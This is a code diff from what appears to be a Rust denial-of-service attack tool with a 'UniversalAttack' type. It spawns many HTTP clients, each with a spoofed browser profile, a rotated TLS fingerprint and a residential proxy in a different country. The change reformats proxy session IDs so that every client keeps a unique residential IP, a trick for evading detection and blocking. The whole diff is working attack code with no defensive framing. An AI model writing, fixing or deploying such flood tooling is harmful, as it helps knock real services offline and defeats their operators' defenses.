@@ -194,7 +194,7 @@ static COUNTRIES: &[&str] = &[
     "IL","TH","MY","ID","PH","VN","NZ","PK","BD","NG",
 ];
 
-fn proxy_url(country: &str, session_id: u64) -> String {
+fn proxy_url(country: &str, session_id: &str) -> String {
     // Unique session per client = unique residential IP per client
     format!(
         "http://{}:{}_country-{}_session-{}@{}:{}",
@@ -284,7 +284,7 @@ fn build_tls_variants() -> Vec<Arc<ClientConfig>> {
     configs
 }
 
-fn make_client(tls: Arc<ClientConfig>, p: &BrowserProfile, conns: usize, country: &str, session_id: u64) -> Option<Client> {
+fn make_client(tls: Arc<ClientConfig>, p: &BrowserProfile, conns: usize, country: &str, session_id: &str) -> Option<Client> {
     let proxy_str = proxy_url(country, session_id);
     let proxy = match reqwest::Proxy::all(&proxy_str) {
         Ok(pr) => pr,
@@ -370,16 +370,19 @@ impl Attack for UniversalAttack {
                 rt.block_on(async move {
                     // Build one client per profile — unique country + session per client
                     // session_id = unique number → unique residential IP per client
-                    let base_session: u64 = (core_id as u64) * 10000 + std::time::SystemTime::now()
-                        .duration_since(std::time::UNIX_EPOCH).unwrap_or_default().as_secs();
+                    // Session ID must be 6-15 chars for proxy (Quantum requirement)
+                    // Use: c<core>p<profile><epoch_low6> — always unique, always within limit
+                    let epoch_low: u64 = std::time::SystemTime::now()
+                        .duration_since(std::time::UNIX_EPOCH).unwrap_or_default().as_secs() % 1_000_000;
 
                     let clients: Vec<(Arc<Client>, usize)> = PROFILES.iter().enumerate()
                         .filter_map(|(pi, prof)| {
                             let tls_idx    = prof.tls_idx % tls_variants.len();
                             let tls        = tls_variants[tls_idx].clone();
                             let country    = COUNTRIES[(core_id * PROFILES.len() + pi) % COUNTRIES.len()];
-                            let session_id = base_session + pi as u64;
-                            make_client(tls, prof, conns, country, session_id).map(|c| (Arc::new(c), pi))
+                            // Format: c{core}p{profile}{epoch6} = e.g. "c0p3812345" (10 chars, within 6-15)
+                            let session_id = format!("c{}p{}{}", core_id, pi, epoch_low);
+                            make_client(tls, prof, conns, country, &session_id).map(|c| (Arc::new(c), pi))
                         })
                         .collect();
 
